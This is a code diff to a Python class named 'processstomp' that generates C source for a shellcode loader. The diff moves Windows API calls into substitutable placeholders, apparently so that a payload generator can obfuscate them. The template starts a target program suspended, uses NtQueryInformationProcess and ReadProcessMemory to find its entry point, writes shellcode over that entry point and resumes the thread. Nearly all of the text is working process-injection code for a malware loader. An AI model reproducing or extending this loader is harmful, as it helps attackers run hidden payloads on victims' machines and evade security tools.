@@ -16,22 +16,15 @@ class processstomp:
         return []
 
     def codeblocks(self) -> str:
-        return """
-NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, /*enum _PROCESSINFOCLASS*/DWORD, PVOID, ULONG, PULONG) = NULL;
-"""
+        return ''
 
     def apicalls(self) -> list[str]:
-        return []
+        return ['NtQueryInformationProcess', 'CreateProcessA', 'ReadProcessMemory', 'WriteProcessMemory', 'ResumeThread', 'CloseHandle']
 
     def template(self) -> str:
         return Template("""
     {transformers}
 
-    pNtQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, /*enum _PROCESSINFOCLASS*/DWORD, PVOID, ULONG, PULONG))
-        GetProcAddress(
-            GetModuleHandle(TEXT("ntdll.dll")), 
-            TEXT("NtQueryInformationProcess"));
-    
     STARTUPINFOA si = {{
         sizeof(si)
     }}; 
@@ -44,14 +37,14 @@ NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, /*enum _PROCESSINFOCLASS*/D
     SIZE_T NumberOfBytesRead;
     DWORD AddressOfEntryPoint;
 
-    CreateProcessA(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    {CreateProcessA}(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     NTSTATUS status;
     PROCESS_BASIC_INFORMATION pbi;
 
     memset(&pbi, 0, sizeof(pbi));
 
-    status = pNtQueryInformationProcess(
+    status = {NtQueryInformationProcess}(
     pi.hProcess,
     ProcessBasicInformation,
     &pbi,
@@ -60,14 +53,14 @@ NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, /*enum _PROCESSINFOCLASS*/D
 
     pPeb = pbi.PebBaseAddress;
 
-    ReadProcessMemory(
+    {ReadProcessMemory}(
         pi.hProcess,
         &pPeb->Reserved3[1],
         &pImage,
         sizeof(pImage),
         &NumberOfBytesRead);
         
-    ReadProcessMemory(
+    {ReadProcessMemory}(
         pi.hProcess,
         (PCHAR)pImage + offsetof(IMAGE_DOS_HEADER, e_lfanew),
         &e_lfanew,
@@ -75,7 +68,7 @@ NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, /*enum _PROCESSINFOCLASS*/D
         &NumberOfBytesRead);
     pNtHeaders = (PIMAGE_NT_HEADERS)((PCHAR)pImage + e_lfanew);
 
-    ReadProcessMemory(
+    {ReadProcessMemory}(
         pi.hProcess,
         (PCHAR)pNtHeaders + offsetof(IMAGE_NT_HEADERS, OptionalHeader.AddressOfEntryPoint),
         &AddressOfEntryPoint,
@@ -83,11 +76,11 @@ NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, /*enum _PROCESSINFOCLASS*/D
         &NumberOfBytesRead);
     pEntry = (PVOID)((PCHAR)pImage + AddressOfEntryPoint);
     
-    WriteProcessMemory(pi.hProcess, pEntry, shellcode, {shellcodeSize}, NULL);
+    {WriteProcessMemory}(pi.hProcess, pEntry, shellcode, {shellcodeSize}, NULL);
 
-    ResumeThread(pi.hThread);
+    {ResumeThread}(pi.hThread);
 
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    {CloseHandle}(pi.hThread);
+    {CloseHandle}(pi.hProcess);
 
 """).substitute(target=self.target)
